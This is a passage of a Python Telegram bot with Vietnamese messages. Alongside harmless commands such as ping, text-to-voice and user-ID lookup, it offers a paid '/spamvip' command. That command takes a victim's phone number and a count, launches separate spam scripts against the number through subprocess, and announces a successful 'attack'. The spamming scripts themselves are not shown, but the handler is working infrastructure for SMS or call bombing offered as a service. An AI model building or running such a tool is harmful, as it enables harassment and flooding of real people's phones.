        # Gửi video
        bot.send_video(message.chat.id, "https://files.catbox.moe/5l74tr.mp4")

    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {e}")
@bot.message_handler(commands=['ping'])
def ping(message):
    start_time = time.time()  # Ghi lại thời gian bắt đầu
    msg = bot.reply_to(message, "Đang kiểm tra độ trễ...")

    # Tính thời gian trễ
    latency = (time.time() - start_time) * 1000  # chuyển sang milliseconds
    bot.edit_message_text(f"https://files.catbox.moe/qpeuq7.mp4\nĐộ trễ của bot là: {latency:.2f} ms", chat_id=message.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['spamvip'])
def supersms(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"ID: {user_id}"  # Lấy username, nếu không có thì dùng ID
    
    if user_id not in allowed_users:
        bot.reply_to(message, 'Hãy Mua Vip Để Sử Dụng.')
        return
    
    current_time = time.time()
    if user_id in last_usage and current_time - last_usage[user_id] < 10:
        bot.reply_to(message, f"Vui lòng đợi {10 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
        return
    
    last_usage[user_id] = current_time

    params = message.text.split()[1:]

    if len(params) != 2:
        bot.reply_to(message, "Vui lòng điền theo lệnh /spamvip <sdt> <số lần>")
        return

    sdt, count = params

    if not count.isdigit():
        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng nhập một số nguyên dương.")
        return
    
    count = int(count)
    
    if count > 20:
        bot.reply_to(message, "/spamvip tối đa spam 20 lần thôi nhé.")
        return

    if sdt in blacklist:
        bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
        return

    # Chạy file dec.py với số lần người dùng yêu cầu
    script_dec = "dec.py"
    if os.path.isfile(script_dec):
        with open(script_dec, 'r', encoding='utf-8') as file:
            script_content = file.read()

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
            temp_file.write(script_content.encode('utf-8'))
            temp_file_path = temp_file.name

        # Chạy file dec.py
        subprocess.Popen(["python", temp_file_path, sdt, str(count)])
    else:
        bot.send_message(message.chat.id, f"File {script_dec} không tồn tại.")
        return

    # Chạy thêm file sms6.py với 50 lần
    script_sms6 = "test.py"
    if os.path.isfile(script_sms6):
        with open(script_sms6, 'r', encoding='utf-8') as file:
            script_content = file.read()

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
            temp_file.write(script_content.encode('utf-8'))
            temp_file_path = temp_file.name

        # Chạy file sms6.py 50 lần
        subprocess.Popen(["python", temp_file_path, sdt, "50"])
    else:
        bot.send_message(message.chat.id, f"File {script_sms6} không tồn tại.")

    notification_msg = f'''
┏━━━━━━━━━━━━━━━━┓
┣➤ 🚀 Gửi Yêu Cầu Tấn Công Thành Công 🚀 
┣➤ Attack By: {username}
┣➤ Số Tấn Công 📱:[ {sdt} ]
┣➤ Thời gian 🕐: 100s
┣➤ Số lần tấn công: {count}
┣➤ Bạn Đang Sử Dụng Spamvip
┣➤ https://files.catbox.moe/vlyr4r.mp4
    '''

    bot.send_message(message.chat.id, notification_msg)

# Xử lý lệnh /voice
@bot.message_handler(commands=['voice'])
def text_to_voice(message):
    try:
        # Lấy văn bản sau lệnh /voice
        text = message.text.replace('/voice', '').strip()
        if not text:
            bot.reply_to(message, "Vui lòng nhập văn bản sau lệnh /voice để chuyển thành giọng nói!")
            return
        
        # Chuyển văn bản thành giọng nói
        tts = gTTS(text=text, lang='vi')  # Ngôn ngữ tiếng Việt
        buffer = BytesIO()
        tts.write_to_fp(buffer)
        buffer.seek(0)
        
        # Gửi file âm thanh cho người dùng
        bot.send_audio(message.chat.id, buffer, title="Giọng nói của bạn", caption="Đây là giọng nói được tạo từ văn bản!")
    
    except Exception as e:
        bot.reply_to(message, f"Đã xảy ra lỗi: {e}")

@bot.message_handler(commands=['ad'])
def send_admin_info(message):
    bot.send_message(
        message.chat.id, 
        f"Only One => Is : {ADMIN_NAME}\nID: `{ADMIN_ID}`", 
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text.isdigit())
def copy_user_id(message):
    bot.send_message(message.chat.id, f"ID của bạn đã được sao chép: `{message.text}`", parse_mode='Markdown')
ADMIN_NAME = "ductuyen2011"
@bot.message_handler(commands=['id'])
def get_user_id(message):
    if len(message.text.split()) == 1:  
        user_id = message.from_user.id
        bot.reply_to(message, f"ID của bạn là: `{user_id}`", parse_mode='Markdown')
    else:  
        username = message.text.split('@')[-1].strip()
        try:
            user = bot.get_chat(username)  # Lấy thông tin người dùng từ username
            bot.reply_to(message, f"ID của {user.first_name} là: `{user.id}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, "Không tìm thấy người dùng có username này.")
@bot.message_handler(commands=['ID'])
def handle_id_command(message):
    chat_id = message.chat.id
    bot.reply_to(message, f"ID của nhóm này là: {chat_id}")
####################
import time

def restart_program():
    """Khởi động lại script chính và môi trường chạy."""
    python = sys.executable
    script = sys.argv[0]
    # Khởi động lại script chính từ đầu
    try:
        subprocess.Popen([python, script])
    except Exception as e:
        print(f"Khởi động lại không thành công: {e}")
    finally:
        time.sleep(10)  # Đợi một chút để đảm bảo instance cũ đã ngừng hoàn toàn
        sys.exit()


@bot.message_handler(commands=['tv'])
def tieng_viet(message):
    chat_id = message.chat.id
    message_id = message.message_id
    
    keyboard = types.InlineKeyboardMarkup()
    url_button = types.InlineKeyboardButton("Tiếng Việt 🇻🇳", url='https://t.me/setlanguage/abcxyz')
    keyboard.add(url_button)
    
    bot.send_message(chat_id, 'Click Vào Nút "<b>Tiếng Việt</b>" để đổi thành tv VN in đờ bét.', reply_markup=keyboard, parse_mode='HTML')
    
    # Delete user's command message
    try:
        bot.delete_message(chat_id, message_id)
    except Exception as e:
        bot.send_message(chat_id, f"Không thể xóa tin nhắn: {e}", parse_mode='HTML')

############
if __name__ == "__main__":
    bot_active = True
    bot.infinity_polling()